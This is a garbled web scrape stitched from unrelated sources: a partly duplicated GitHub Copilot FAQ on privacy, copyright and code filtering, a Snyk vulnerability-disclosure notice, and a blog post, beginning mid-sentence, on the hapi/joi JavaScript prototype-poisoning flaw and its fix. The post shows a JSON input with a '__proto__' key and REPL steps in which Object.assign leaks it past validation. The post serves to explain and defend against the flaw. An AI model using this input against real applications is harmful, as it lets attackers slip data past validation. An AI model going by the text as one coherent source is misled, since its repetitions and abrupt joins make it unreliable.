Yes. GitHub and customers can enter a [Data Protection Agreement](https://github.com/customer-terms/github-data-protection-agreement) that supports compliance with the GDPR and similar legislation.

#### Does GitHub Copilot ever output personal data?

While we've designed GitHub Copilot with privacy in mind, the expansive definition of personal data under legislation like the EU’s General Data Protection Regulation (GDPR) means we can't guarantee it will never output such data. The Large Language Model (LLM) powering GitHub Copilot was trained on public code and there were instances in our tests where the tool made suggestions resembling personal data. These suggestions were typically synthesized and not tied to real individuals.

#### How does Copilot allow users to access, alter or delete personal data?

These actions are available to Copilot users as described in the [GitHub Privacy Statement](https://docs.github.com/en/site-policy/privacy-policies/github-general-privacy-statement#your-privacy-rights).

#### Responsible AI

#### What are the intellectual property considerations when using GitHub Copilot?

The primary IP considerations for GitHub Copilot relate to copyright. The model that powers Copilot is trained on a broad collection of publicly accessible code, which may include copyrighted code, and Copilot’s suggestions (in rare instances) may resemble the code its model was trained on. Here’s some basic information you should know about these considerations:

Copyright law permits the use of copyrighted works to train AI models:  Countries around the world have provisions in their copyright laws that enable machines to learn, understand, extract patterns, and facts from copyrighted materials, including software code. For example, the European Union, Japan, and Singapore, have express provisions permitting machine learning to develop AI models. Other countries including Canada, India, and the United States also permit such training under their fair use/fair dealing provisions. GitHub Copilot’s AI model was trained with the use of code from GitHub’s public repositories—which are publicly accessible and within the scope of permissible copyright use.

What about copyright risk in suggestions? In rare instances (less than 1% based on GitHub’s research), suggestions from GitHub may match examples of code used to train GitHub’s AI model. Again, Copilot does not “look up” or “copy and paste” code, but is instead using context from a user’s workspace to synthesize and generate a suggestion.

Our experience shows that matching suggestions are most likely to occur in two situations: (i) when there is little or no context in the code editor for Copilot’s model to synthesize, or (ii) when a matching suggestion represents a common approach or method. If a code suggestion matches existing code, there is risk that using that suggestion could trigger claims of copyright infringement, which would depend on the amount and nature of code used, and the context of how the code is used. In many ways, this is the same risk that arises when using any code that a developer does not originate, such as copying code from an online source, or reusing code from a library. That is why responsible organizations and developers recommend that users employ code scanning policies to identify and evaluate potential matching code.

In Copilot, you can opt whether to allow Copilot to suggest code completions that match publicly available code on GitHub.com. For more information, see "[Configuring GitHub Copilot settings on GitHub.com](https://docs-internal-46619-d1aa34.preview.ghdocs.com/en/copilot/configuring-github-copilot/configuring-github-copilot-settings-on-githubcom#enabling-or-disabling-duplication-detection)". If you have allowed suggestions that match public code, GitHub Copilot can provide you with details about the matching code when you accept such suggestions. Matching code does not necessarily mean copyright infringement, so it is ultimately up to the user to determine whether to use the suggestion, and what and who to attribute (along with other license compliance) in appropriate circumstances.

#### Does GitHub Copilot include a filtering mechanism to mitigate risk?

Yes, GitHub Copilot does include an optional code referencing filter to detect and suppress certain suggestions that match public code on GitHub.

* GitHub has created a duplication detection filter to detect and suppress suggestions that contain code segments over a certain length that match public code on GitHub. This filter can be enabled by the administrator for your enterprise and it can apply for all organizations within your enterprise, or the administrator can defer control to individual organizations.
* With the filter enabled, Copilot checks code suggestions for matches or near-matches against public code on GitHub of 65 lexemes or more (on average,150 characters). If there is a match, the suggestion will not be shown to the user.
* In addition to off-topic, harmful, and offensive output filters, GitHub Copilot also scans the outputs for vulnerable code.

#### Does GitHub Copilot include features to make it easier for users to identify potentially relevant open source licenses for matching suggestions?

Yes, GitHub Copilot is previewing a [code referencing feature](https://github.blog/2023-08-03-introducing-code-referencing-for-github-copilot/) as an additional tool to assist users to find and review potentially relevant open source licenses. Code referencing is currently available in Visual Studio Code. This feature searches across public GitHub repositories for code that matches a Copilot suggestion. If there’s a match, users will find its information displayed in the Copilot console log, including where the match occurred, any applicable licenses, and a deep link to learn more. The deep link will take users to a navigable page on GitHub.com to browse examples of the code match and their repository licenses, and see how many repositories—including ones without licenses—that code appears in, as well as links to those repositories. Copilot users can review this information to determine whether the applicable suggestions are suitable for use, and whether additional measures may be necessary to use them.

#### Who owns the suggestions provided by GitHub Copilot?

We don’t determine whether a suggestion is capable of being owned, but we are clear that GitHub does not claim ownership of a suggestion. Whether a suggestion generated by an AI model can be owned depends on many factors (e.g. the intellectual property law in the relevant country, the length of the suggestion, the extent that suggestion is considered ‘functional’ instead of expressive, etc).

* If a suggestion is capable of being owned, our terms are clear: GitHub does not claim ownership.
* GitHub does not claim ownership of any suggestion. In certain cases, it is possible for Copilot to produce similar suggestions to different users. For example, two unrelated users both starting new files to code the quicksort algorithm in Java will likely get the same suggestion. The possibility of providing similar suggestions to multiple users is a common part of generative AI systems.

#### Can GitHub Copilot introduce insecure code in its suggestions?

Public code may contain insecure coding patterns, bugs, or references to outdated APIs or idioms. When GitHub Copilot synthesizes code suggestions based on this data, it can also synthesize code that contains these undesirable patterns. Copilot has filters in place that either block or notify users of insecure code patterns that are detected in Copilot suggestions. These filters target the most common vulnerable coding patterns, including [hardcoded credentials](https://cwe.mitre.org/data/definitions/798.html), [SQL injections](https://cwe.mitre.org/data/definitions/89.html), and [path injections](https://cwe.mitre.org/data/definitions/22.html). Additionally, in recent years we’ve provided tools such as GitHub Advanced Security, GitHub Actions, Dependabot, and CodeQL to open source projects to help improve code quality. Of course, you should always use GitHub Copilot together with good testing and code review practices and security tools, as well as your own judgment.

#### Is GitHub Copilot intended to fully automate code generation and replace developers?

No. Copilot is a tool intended to make developers more efficient. It’s not intended to replace developers, who should continue to apply the same sorts of safeguards and diligence they would apply with regard to any third-party code of unknown origin.

* The product is called “Copilot” not “Autopilot” and it’s not intended to generate code without oversight. You should use exactly the same sorts of safeguards and diligence with Copilot’s suggestions as you would use with any third-party code.
* Identifying best practices for use of third party code is beyond the scope of this section. That said, whatever practices your organization currently uses – rigorous functionality testing, code scanning, security testing, etc. – you should continue these policies with Copilot’s suggestions. Moreover, you should make sure your code editor or editor does not automatically compile or run generated code before you review it.

#### Can GitHub Copilot users simply use suggestions without concern?

Not necessarily. GitHub Copilot users should align their use of Copilot with their respective risk tolerances.

* As noted above, GitHub Copilot is not intended to replace developers, or their individual skill and judgment, and is not intended to fully automate the process of code development. The same risks that apply to the use of any third-party code apply to the use of Copilot’s suggestions.
* Depending on your particular use case, you should consider implementing the protections discussed above. It is your responsibility to assess what is appropriate for the situation and implement appropriate safeguards.
* You’re entitled to IP indemnification from GitHub for the unmodified suggestions when Copilot’s filtering is enabled. If you do elect to enable this feature, the copyright responsibility is ours, not our customers. As part of our ongoing commitment to responsible AI, GitHub and Microsoft extends our IP indemnity and protection support to our customers who are empowering their teams with GitHub Copilot. See [Microsoft's Copilot Copyright Commitment](https://blogs.microsoft.com/on-the-issues/2023/09/07/copilot-copyright-commitment-ai-legal-concerns/) for more details.

#### Does GitHub Copilot support accessibility features?

We are conducting internal testing of GitHub Copilot’s ease of use by developers with disabilities and working to ensure that GitHub Copilot is accessible to all developers. Please feel free to share your feedback on GitHub Copilot accessibility in our [feedback forum](https://github.com/github-community/community/discussions/categories/copilot).

#### Does GitHub Copilot produce offensive outputs?

GitHub Copilot includes filters to block offensive language in the prompts and to avoid synthesizing suggestions in sensitive contexts. We continue to work on improving the filter system to more intelligently detect and remove offensive outputs. If you see offensive outputs, please report them directly to copilot-safety@github.com so that we can improve our safeguards. GitHub takes this challenge very seriously and we are committed to addressing it.

#### Will GitHub Copilot work as well using languages other than English?

Given public sources are predominantly in English, GitHub Copilot will likely work less well in scenarios where natural language prompts provided by the developer are not in English and/or are grammatically incorrect. Therefore, non-English speakers might experience a lower quality of service.

#### What data has GitHub Copilot been trained on?

GitHub Copilot is powered by generative AI models developed by GitHub, OpenAI, and Microsoft. It has been trained on natural language text and source code from publicly available sources, including code in public repositories on GitHub.

1. Data from June 2023. Additional research can be found [here](https://github.blog/news-insights/research/the-economic-impact-of-the-ai-powered-developer-lifecycle-and-lessons-from-github-copilot/).
2. Feature in public beta for Copilot Pro and Business plans. Requires use of repositories, issues, discussions, Actions, and other features of GitHub.

GeneralPlans & PricingPrivacyResponsible AI
### General

#### What is GitHub Copilot?

GitHub Copilot transforms the developer experience. Backed by the leaders in AI, Copilot provides contextualized assistance throughout the software development lifecycle, from code completions and chat assistance in the IDE to code explanations and answers to docs in GitHub and more. With Copilot elevating their workflow, developers can focus on more: value, innovation, and happiness.

GitHub Copilot enables developers to focus more energy on problem solving and collaboration and spend less effort on the mundane and boilerplate. That’s why developers who use Copilot report up to 75% higher satisfaction with their jobs than those who don’t and are up to 55% more productive at writing code without sacrifice to quality, which all adds up to engaged developers shipping great software faster.

GitHub Copilot integrates with leading editors, including Visual Studio Code, Visual Studio, JetBrains IDEs, and Neovim, and, unlike other AI coding assistants, is natively built into GitHub. Growing to millions of individual users and tens of thousands of business customers, Copilot is the world’s most widely adopted AI developer tool and the competitive advantage developers ask for by name.

#### Who is eligible to access GitHub Copilot for free?

GitHub Copilot Free is a new free pricing tier with limited functionality for individual developers. Users assigned a Copilot Business or Copilot Enterprise seat are not eligible for access. Users with access to Copilot Pro through a paid subscription, trial, or through an existing verified OSS, Student, Faculty, or MVP account may elect to use Free instead.

#### What languages, IDEs, and platforms does GitHub Copilot support?

GitHub Copilot is trained on all languages that appear in public repositories. For each language, the quality of suggestions you receive may depend on the volume and diversity of training data for that language. For example, JavaScript is well-represented in public repositories and is one of GitHub Copilot’s best supported languages. Languages with less representation in public repositories may produce fewer or less robust suggestions.

GitHub Copilot is available as an extension in Visual Studio Code, Visual Studio, Vim, Neovim, the JetBrains suite of IDEs, and Azure Data Studio. Although code completion functionality is available across all these extensions, chat functionality is currently available only in Visual Studio Code, JetBrains and Visual Studio. GitHub Copilot is also supported in terminals through GitHub CLI and as a chat integration in Windows Terminal Canary. With the GitHub Copilot Enterprise plan, GitHub Copilot is natively integrated into GitHub.com. All plans are supported in GitHub Copilot in GitHub Mobile. GitHub Mobile for Copilot Pro and Copilot Business have access to Bing and public repository code search. Copilot Enterprise in GitHub Mobile gives you additional access to your organization's knowledge.

#### Does GitHub Copilot “copy/paste”?

No, GitHub Copilot generates suggestions using probabilistic determination.

* When thinking about intellectual property and open source issues, it is critical to understand how GitHub Copilot really works. The AI models that create Copilot’s suggestions may be trained on public code, but do not contain any code. When they generate a suggestion, they are not “copying and pasting” from any codebase.
* To generate a code suggestion, the Copilot extension begins by examining the code in your editor—focusing on the lines just before and after your cursor, but also information including other files open in your editor and the URLs of repositories or file paths to identify relevant context. That information is sent to Copilot’s model, to make a probabilistic determination of what is likely to come next and generate suggestions.
* To generate a suggestion for chat in the code editor, the Copilot extension creates a contextual prompt by combining your prompt with additional context including the code file open in your active document, your code selection, and general workspace information, such as frameworks, languages, and dependencies. That information is sent to Copilot’s model, to make a probabilistic determination of what is likely to come next and generate suggestions.
* To generate a suggestion for chat on GitHub.com, such as providing an answer to a question from your chat prompt, Copilot creates a contextual prompt by combining your prompt with additional context including previous prompts, the open pages on GitHub.com as well as retrieved context from your codebase or Bing search. That information is sent to Copilot’s model, to make a probabilistic determination of what is likely to come next and generate suggestions.

#### What are the differences between the GitHub Copilot Business, GitHub Copilot Enterprise, and GitHub Copilot Individual plans?

GitHub Copilot has multiple offerings for organizations and an offering for individual developers. All the offerings include both code completion and chat assistance. The primary differences between the organization offerings and the individual offering are license management, policy management, and IP indemnity.

### Privacy

#### What personal data does GitHub Copilot process?

GitHub Copilot processes personal data based on how Copilot is accessed and used: whether via GitHub.com, mobile app, extensions, or one of various IDE extensions, or through features like suggestions for the command line interface (CLI), IDE code completions, or personalized chat on GitHub.com. The types of personal data processed may include:

* **User Engagement Data:** This includes pseudonymous identifiers captured on user interactions with Copilot, such as accepted or dismissed completions, error messages, system logs, and product usage metrics.
* **Prompts:** These are inputs for chat or code, along with context, sent to Copilot's AI to generate suggestions.
* **Suggestions:** These are the AI-generated code lines or chat responses provided to users based on their prompts.
* **Feedback Data:** This comprises real-time user feedback, including reactions (e.g., thumbs up/down) and optional comments, along with feedback from support tickets.

#### Does GitHub use Copilot Business or Enterprise data to train GitHub’s model?

No. GitHub does not use either Copilot Business or Enterprise data to train its models.

#### How does GitHub use the Copilot data?

How GitHub uses Copilot data depends on how the user accesses Copilot and for what purpose. Users can access GitHub Copilot through the web, extensions, mobile apps, computer terminal, and various IDEs (Integrated Development Environments). GitHub generally uses personal data to:

* Deliver, maintain, and update the services as per the customer's configuration and usage, to ensure personalized experiences and recommendations
* Troubleshoot, which involves preventing, detecting, resolving, and mitigating issues, including security incidents and product-related problems, by fixing software bugs and maintaining the online services' functionality and up-to-dateness
* Enhance user productivity, reliability, effectiveness, quality, privacy, accessibility, and security by keeping the service current and operational

These practices are outlined in GitHub’s Data Protection Agreement ([DPA)](https://github.com/customer-terms/github-data-protection-agreement), which details our data handling commitments to our data controller customers.

GitHub also uses certain personal data with customer authorization under the DPA, for the following purposes:

* Billing and account management
* To comply with and resolve legal obligations
* For abuse detection, prevention, and protection, virus scanning, and scanning to detect violations of terms of service
* To generate summary reports for calculating employee commissions and partner incentives
* To produce aggregated reports for internal use and strategic planning, covering areas like forecasting, revenue analysis, capacity planning, and product strategy,

For details on GitHub's data processing activities as a controller, particularly for Copilot Pro customers, refer to the [GitHub Privacy Statement](https://docs.github.com/en/site-policy/privacy-policies/github-general-privacy-statement).

#### How long does GitHub retain Copilot data for Business and Enterprise customers?

If and for how long GitHub’s retains Copilot data depends on how a Copilot user accesses Copilot and for what purpose. The default settings for Copilot Business and Enterprise Customers are as follows:

**Access through IDE for Chat and Code Completions:**

* Prompts and Suggestions: Not retained
* User Engagement Data: Kept for two years.
* Feedback Data: Stored for as long as needed for its intended purpose.

**All other GitHub Copilot access and use:**

* Prompts and Suggestions: Retained for 28 days.
* User Engagement Data: Kept for two years.
* Feedback Data: Stored for as long as needed for its intended purpose.

#### Why do some Copilot features retain prompts and suggestions?

Retaining prompts and suggestions is necessary for chat on github.com, mobile, and CLI Copilot because those features’ effectiveness depends on using thread history to improve responses. The Copilot model requires access to previous interactions to deliver accurate and relevant suggestions.

#### Does GitHub Copilot support compliance with the GDPR and other data protection laws?

Yes. GitHub and customers can enter a [Data Protection Agreement](https://github.com/customer-terms/github-data-protection-agreement) that supports compliance with the GDPR and similar legislation.

#### Does GitHub Copilot ever output personal data?

While we've designed GitHub Copilot with privacy in mind, the expansive definition of personal data under legislation like the EU’s General Data Protection Regulation (GDPR) means we can't guarantee it will never output such data. The Large Language Model (LLM) powering GitHub Copilot was trained on public code and there were instances in our tests where the tool made suggestions resembling personal data. These suggestions were typically synthesized and not tied to real individuals.

#### How does Copilot allow users to access, alter or delete personal data?

These actions are available to Copilot users as described in the [GitHub Privacy Statement](https://docs.github.com/en/site-policy/privacy-policies/github-general-privacy-statement#your-privacy-rights).

### Responsible AI

#### What are the intellectual property considerations when using GitHub Copilot?

The primary IP considerations for GitHub Copilot relate to copyright. The model that powers Copilot is trained on a broad collection of publicly accessible code, which may include copyrighted code, and Copilot’s suggestions (in rare instances) may resemble the code its model was trained on. Here’s some basic information you should know about these considerations:

Copyright law permits the use of copyrighted works to train AI models:  Countries around the world have provisions in their copyright laws that enable machines to learn, understand, extract patterns, and facts from copyrighted materials, including software code. For example, the European Union, Japan, and Singapore, have express provisions permitting machine learning to develop AI models. Other countries including Canada, India, and the United States also permit such training under their fair use/fair dealing provisions. GitHub Copilot’s AI model was trained with the use of code from GitHub’s public repositories—which are publicly accessible and within the scope of permissible copyright use.

What about copyright risk in suggestions? In rare instances (less than 1% based on GitHub’s research), suggestions from GitHub may match examples of code used to train GitHub’s AI model. Again, Copilot does not “look up” or “copy and paste” code, but is instead using context from a user’s workspace to synthesize and generate a suggestion.

Our experience shows that matching suggestions are most likely to occur in two situations: (i) when there is little or no context in the code editor for Copilot’s model to synthesize, or (ii) when a matching suggestion represents a common approach or method. If a code suggestion matches existing code, there is risk that using that suggestion could trigger claims of copyright infringement, which would depend on the amount and nature of code used, and the context of how the code is used. In many ways, this is the same risk that arises when using any code that a developer does not originate, such as copying code from an online source, or reusing code from a library. That is why responsible organizations and developers recommend that users employ code scanning policies to identify and evaluate potential matching code.

In Copilot, you can opt whether to allow Copilot to suggest code completions that match publicly available code on GitHub.com. For more information, see "[Configuring GitHub Copilot settings on GitHub.com](https://docs-internal-46619-d1aa34.preview.ghdocs.com/en/copilot/configuring-github-copilot/configuring-github-copilot-settings-on-githubcom#enabling-or-disabling-duplication-detection)". If you have allowed suggestions that match public code, GitHub Copilot can provide you with details about the matching code when you accept such suggestions. Matching code does not necessarily mean copyright infringement, so it is ultimately up to the user to determine whether to use the suggestion, and what and who to attribute (along with other license compliance) in appropriate circumstances.

#### Does GitHub Copilot include a filtering mechanism to mitigate risk?

Yes, GitHub Copilot does include an optional code referencing filter to detect and suppress certain suggestions that match public code on GitHub.

* GitHub has created a duplication detection filter to detect and suppress suggestions that contain code segments over a certain length that match public code on GitHub. This filter can be enabled by the administrator for your enterprise and it can apply for all organizations within your enterprise, or the administrator can defer control to individual organizations.
* With the filter enabled, Copilot checks code suggestions for matches or near-matches against public code on GitHub of 65 lexemes or more (on average,150 characters). If there is a match, the suggestion will not be shown to the user.
* In addition to off-topic, harmful, and offensive output filters, GitHub Copilot also scans the outputs for vulnerable code.

#### Does GitHub Copilot include features to make it easier for users to identify potentially relevant open source licenses for matching suggestions?

Yes, GitHub Copilot is previewing a [code referencing feature](https://github.blog/2023-08-03-introducing-code-referencing-for-github-copilot/) as an additional tool to assist users to find and review potentially relevant open source licenses. Code referencing is currently available in Visual Studio Code. This feature searches across public GitHub repositories for code that matches a Copilot suggestion. If there’s a match, users will find its information displayed in the Copilot console log, including where the match occurred, any applicable licenses, and a deep link to learn more. The deep link will take users to a navigable page on GitHub.com to browse examples of the code match and their repository licenses, and see how many repositories—including ones without licenses—that code appears in, as well as links to those repositories. Copilot users can review this information to determine whether the applicable suggestions are suitable for use, and whether additional measures may be necessary to use them.

#### Who owns the suggestions provided by GitHub Copilot?

We don’t determine whether a suggestion is capable of being owned, but we are clear that GitHub does not claim ownership of a suggestion. Whether a suggestion generated by an AI model can be owned depends on many factors (e.g. the intellectual property law in the relevant country, the length of the suggestion, the extent that suggestion is considered ‘functional’ instead of expressive, etc).

* If a suggestion is capable of being owned, our terms are clear: GitHub does not claim ownership.
* GitHub does not claim ownership of any suggestion. In certain cases, it is possible for Copilot to produce similar suggestions to different users. For example, two unrelated users both starting new files to code the quicksort algorithm in Java will likely get the same suggestion. The possibility of providing similar suggestions to multiple users is a common part of generative AI systems.

#### Can GitHub Copilot introduce insecure code in its suggestions?

Public code may contain insecure coding patterns, bugs, or references to outdated APIs or idioms. When GitHub Copilot synthesizes code suggestions based on this data, it can also synthesize code that contains these undesirable patterns. Copilot has filters in place that either block or notify users of insecure code patterns that are detected in Copilot suggestions. These filters target the most common vulnerable coding patterns, including [hardcoded credentials](https://cwe.mitre.org/data/definitions/798.html), [SQL injections](https://cwe.mitre.org/data/definitions/89.html), and [path injections](https://cwe.mitre.org/data/definitions/22.html). Additionally, in recent years we’ve provided tools such as GitHub Advanced Security, GitHub Actions, Dependabot, and CodeQL to open source projects to help improve code quality. Of course, you should always use GitHub Copilot together with good testing and code review practices and security tools, as well as your own judgment.

No. Copilot is a tool intended to make developers more efficient. It’s not intended to replace developers, who should continue to apply the same sorts of safeguards and diligence they would apply with regard to any third-party code of unknown origin.

* The product is called “Copilot” not “Autopilot” and it’s not intended to generate code without oversight. You should use exactly the same sorts of safeguards and diligence with Copilot’s suggestions as you would use with any third-party code.

# Vulnerability Disclosure

We at Snyk value the security community and believe that a responsible disclosure of security vulnerabilities in open source packages helps us ensure the security and privacy of the users. We aim to provide a disclosure program for the security community to report security issues found within languages including JavaScript, Java, Python, .NET, Go, Ruby and PHP.

Using this form, you can disclose vulnerabilities you’ve found or vulnerabilities that are missing within [Snyk Vulnerability Database](https://security.snyk.io/), and we’ll help you verify the vulnerability and contact the maintainer. In addition, as a CVE Numbering Authority (CNA) we are also able to assign a CVE for the issue.

Before submitting a report, please review our disclosure policy which can be found [here](https://docs.snyk.io/disclosing-vulnerabilities/disclose-a-vulnerability-in-an-open-source-package).

For any questions or follow ups on the disclosure you may email us at report@snyk.io.

open-source software and the limitations of existing communication channels.

But first, if we use a JavaScript framework to process incoming JSON data, take
a moment to read up on [Prototype Poisoning](https://medium.com/intrinsic/javascript-prototype-poisoning-vulnerabilities-in-the-wild-7bc15347c96)
in general, and the specific
[technical details](https://github.com/hapijs/hapi/issues/3916) of this issue.
This could be a critical issue so, we might need to verify your own code first.
It focuses on specific framework however, any solution that uses `JSON.parse()`
to process external data is potentially at risk.

### BOOM[​](#boom "Direct link to BOOM")

The engineering team at Lob (long time generous supporters of my work!) reported
a critical security vulnerability they identified in our data validation
module — [joi](https://github.com/hapijs/joi). They provided some technical
details and a proposed solution.

The main purpose of a data validation library is to ensure the output fully
complies with the rules defined. If it doesn't, validation fails. If it passes,
we can blindly trust that the data you are working with is safe. In fact, most
developers treat validated input as completely safe from a system integrity
perspective which is crucial!

In our case, the Lob team provided an example where some data was able to escape
by the validation logic and pass through undetected. This is the worst possible
defect a validation library can have.

### Prototype in a nutshell[​](#prototype-in-anutshell "Direct link to Prototype in a nutshell")

To understand this, we need to understand how JavaScript works a bit.
Every object in JavaScript can have a prototype. It is a set of methods and
properties it "inherits" from another object. I have put inherits in quotes
because JavaScript isn't really an object-oriented language. It is a prototype-
based object-oriented language.

A long time ago, for a bunch of irrelevant reasons, someone decided that it
would be a good idea to use the special property name `__proto__` to access (and
set) an object's prototype. This has since been deprecated but nevertheless,
fully supported.

To demonstrate:

```
> const a = { b: 5 };
> a.b;
5
> a.__proto__ = { c: 6 };
> a.c;
6
> a;
{ b: 5 }

```

The object doesn't have a `c` property, but its prototype does.
When validating the object, the validation library ignores the prototype and
only validates the object's own properties. This allows `c` to sneak in via the
prototype.

Another important part is the way `JSON.parse()` — a utility
provided by the language to convert JSON formatted text into
objects  —  handles this magic `__proto__` property name.

```
> const text = '{"b": 5, "__proto__": { "c": 6 }}';
> const a = JSON.parse(text);
> a;
{b: 5, __proto__: { c: 6 }}

```

Notice how `a` has a `__proto__` property. This is not a prototype reference. It
is a simple object property key, just like `b`. As we've seen from the first
example, we can't actually create this key through assignment as that invokes
the prototype magic and sets an actual prototype. `JSON.parse()` however, sets a
simple property with that poisonous name.

By itself, the object created by `JSON.parse()` is perfectly safe. It doesn't
have a prototype of its own. It has a seemingly harmless property that just
happens to overlap with a built-in JavaScript magic name.

However, other methods are not as lucky:

```
> const x = Object.assign({}, a);
> x;
{ b: 5}
> x.c;
6;

```

If we take the `a` object created earlier by `JSON.parse()` and pass it to the
helpful `Object.assign()` method (used to perform a shallow copy of all the top
level properties of `a` into the provided empty `{}` object), the magic
`__proto__` property "leaks" and becomes `x` 's actual prototype.

Surprise!

If you get some external text input and parse it with `JSON.parse()`
then perform some simple manipulation of that object (e.g shallow clone and add
an `id` ), and pass it to our validation library, it would sneak in undetected
via `__proto__`.

### Oh joi![​](#oh-joi "Direct link to Oh joi!")

The first question is, of course, why does the validation module **joi** ignore
the prototype and let potentially harmful data through? We asked ourselves the
same question and our instant thought was "it was an oversight". A bug - a really
big mistake. The joi module should not have allowed this to happen. But…

While joi is used primarily for validating web input data, it also has a
significant user base using it to validate internal objects, some of which have
prototypes. The fact that joi ignores the prototype is a helpful "feature". It
allows validating the object's own properties while ignoring what could be a
very complicated prototype structure (with many methods and literal properties).

Any solution at the joi level would mean breaking some currently working code.

### The right thing[​](#the-rightthing "Direct link to The right thing")

At this point, we were looking at a devastatingly bad security vulnerability.
Right up there in the upper echelons of epic security failures. All we knew is
that our extremely popular data validation library fails to block harmful data,
and that this data is trivial to sneak through. All you need to do is add
`__proto__` and some crap to a JSON input and send it on its way to an
application built using our tools.

(Dramatic pause)

We knew we had to fix joi to prevent this but given the scale of this issue, we
had to do it in a way that will put a fix out without drawing too much attention
to it — without making it too easy to exploit — at least for a few days until
most systems received the update.

Sneaking a fix isn't the hardest thing to accomplish. If you combine it with an
otherwise purposeless refactor of the code, and throw in a few unrelated bug
fixes and maybe a cool new feature, you can publish a new version without
drawing attention to the real issue being fixed.

The problem was, the right fix was going to break valid use cases. You see, joi
has no way of knowing if you want it to ignore the prototype you set, or block
the prototype set by an attacker. A solution that fixes the exploit will break
code and breaking code tends to get a lot of attention.

On the other hand, if we released a proper ([semantically
versioned](https://semver.org/)) fix, mark it as a breaking change, and add a
new API to explicitly tell joi what you want it to do with the prototype, we
will share with the world how to exploit this vulnerability while also making it
more time consuming for systems to upgrade (breaking changes never get applied
automatically by build tools).

### A detour[​](#a-detour "Direct link to A detour")

While the issue at hand was about incoming request payloads, we had to pause and
check if it could also impact data coming via the query string, cookies, and
headers. Basically, anything that gets serialized into objects from text.

We quickly confirmed node default query string parser was fine as well as its
header parser. I identified one potential issue with base64-encoded JSON cookies
as well as the usage of custom query string parsers. We also wrote some tests to
confirm that the most popular third-party query string parser  —
[qs](https://www.npmjs.com/package/qs) —  was not vulnerable (it is not!).

### A development[​](#a-development "Direct link to A development")

Throughout this triage, we just assumed that the offending input with its
poisoned prototype was coming into joi from hapi, the web framework connecting
the hapi.js ecosystem. Further investigation by the Lob team found that the
problem was a bit more nuanced.

hapi used `JSON.parse()` to process incoming data. It first set the result
object as a `payload` property of the incoming request, and then passed that
same object for validation by joi before being passed to the application
business logic for processing. Since `JSON.parse()` doesn't actually leak the
`__proto__` property, it would arrive to joi with an invalid key and fail
validation.

However, hapi provides two extension points where the payload data can be
inspected (and processed) prior to validation. It is all properly documented and
well understood by most developers. The extension points are there to allow you
to interact with the raw inputs prior to validation for legitimate (and often
security related) reasons.

If during one of these two extension points, a developer used `Object.assign()`
or a similar method on the payload, the `__proto__` property would leak and
become an actual prototype.

### Sigh of relief[​](#sigh-ofrelief "Direct link to Sigh of relief")

We were now dealing with a much different level of awfulness. Manipulating the
payload object prior to validation is not common which meant this was no longer
a doomsday scenario. It was still potentially catastrophic but the exposure
dropped from every joi user to some very specific implementations.

We were no longer looking at a secretive joi release. The issue in joi is still
there, but we can now address it properly with a new API and breaking release
over the next few weeks.

We also knew that we can easily mitigate this vulnerability at the framework
level since it knows which data is coming from the outside and which is
internally generated. The framework is really the only piece that can protect
developers against making such unexpected mistakes.

### Good news, bad news, no news?[​](#good-news-bad-news-nonews "Direct link to Good news, bad news, no news?")

The good news was that this wasn't our fault. It wasn't a bug in hapi or joi. It
was only possible through a complex combination of actions that was not unique
to hapi or joi. This can happen with every other JavaScript framework. If hapi
is broken, then the world is broken.

Great — we solved the blame game.

The bad news is that when there is nothing to blame (other than JavaScript
itself), it is much harder getting it fixed.

The first question people ask once a security issue is found is if there is
going to be a CVE published. A CVE — Common Vulnerabilities and Exposures — is a
[database](https://cve.mitre.org/) of known security issues. It is a critical
component of web security. The benefit of publishing a CVE is that it
immediately triggers alarms and informs and often breaks automated builds until
the issue is resolved.

But what do we pin this to?

Probably, nothing. We are still debating whether we should tag some versions of
hapi with a warning. The "we" is the node security process. Since we now have a
new version of hapi that mitigate the problem by default, it can be considered a
fix. But because the fix isn't to a problem in hapi itself, it is not exactly
kosher to declare older versions harmful.

Publishing an advisory on previous versions of hapi for the sole purpose of
nudging people into awareness and upgrade is an abuse of the advisory process.
I'm personally fine with abusing it for the purpose of improving security but
that's not my call. As of this writing, it is still being debated.

### The solution business[​](#the-solutionbusiness "Direct link to The solution business")

Mitigating the issue wasn't hard. Making it scale and safe was a bit more
involved. Since we knew where harmful data can enter the system, and we knew
where we used the problematic `JSON.parse()` we could replace it with a safe
implementation.

One problem. Validating data can be costly and we are now planning on validating
every incoming JSON text. The built-in `JSON.parse()` implementation is fast.
Really really fast. It is unlikely we can build a replacement that will be more
secure and anywhere as fast. Especially not overnight and without introducing
new bugs.

It was obvious we were going to wrap the existing `JSON.parse()` method with
some additional logic. We just had to make sure it was not adding too much
overhead. This isn't just a performance consideration but also a security one.
If we make it easy to slow down a system by simply sending specific data, we
make it easy to execute a [DoS
attack](https://en.wikipedia.org/wiki/Denial-of-service_attack) at very low
cost.

I came up with a stupidly simple solution: first parse the text using the
existing tools. If this didn't fail, scan the original raw text for the
offending string "**proto**". Only if we find it, perform an actual scan of the
object. We can't block every reference to "**proto**" — sometimes it is
perfectly valid value (like when writing about it here and sending this text
over to Medium for publication).

This made the "happy path" practically as fast as before. It just added one
function call, a quick text scan (again, very fast built-in implementation), and
a conditional return. The solution had negligible impact on the vast majority of
data expected to pass through it.

Next problem. The prototype property doesn't have to be at the top level of the
incoming object. It can be nested deep inside. This means we cannot just check
for the presence of it at the top level. We need to recursively iterate through
the object.

While recursive functions are a favorite tool, they could be disastrous when
writing security-conscious code. You see, recursive function increase the size
of the runtime call stack. The more times you loop, the longer the call stack
gets. At some point — KABOOM— you reach the maximum length and the process dies.

If you cannot guarantee the shape of the incoming data, recursive iteration
becomes an open threat. An attacker only needs to craft a deep enough object to
crash your servers.

I used a flat loop implementation that is both more memory efficient (less
function calls, less passing of temporary arguments) and more secure. I am not
pointing this out to brag, but to highlight how basic engineering practices can
create (or avoid) security pitfalls.

### Putting it to the test[​](#putting-it-to-thetest "Direct link to Putting it to the test")

I sent the code to two people. First to [Nathan
LaFreniere](https://github.com/nlf) to double check the security properties of
the solution, and then to [Matteo Collina](https://github.com/mcollina) to
review the performance. They are among the very best at what they do and often
my go-to people.

The performance benchmarks confirmed that the "happy path" was practically
unaffected. The interesting findings was that removing the offending values was
faster then throwing an exception. This raised the question of what should be
the default behavior of the new module — which I called
[**bourne**](https://github.com/hapijs/bourne) —  error or sanitize.

The concern, again, was exposing the application to a DoS attack. If sending a
request with `__proto__` makes things 500% slower, that could be an easy vector
to exploit. But after a bit more testing we confirmed that sending **any**
invalid JSON text was creating a very similar cost.

In other words, if you parse JSON, invalid values are going to cost you more,
regardless of what makes them invalid. It is also important to remember that
while the benchmark showed the significant % cost of scanning suspected objects,
the actual cost in CPU time was still in the fraction of milliseconds. Important
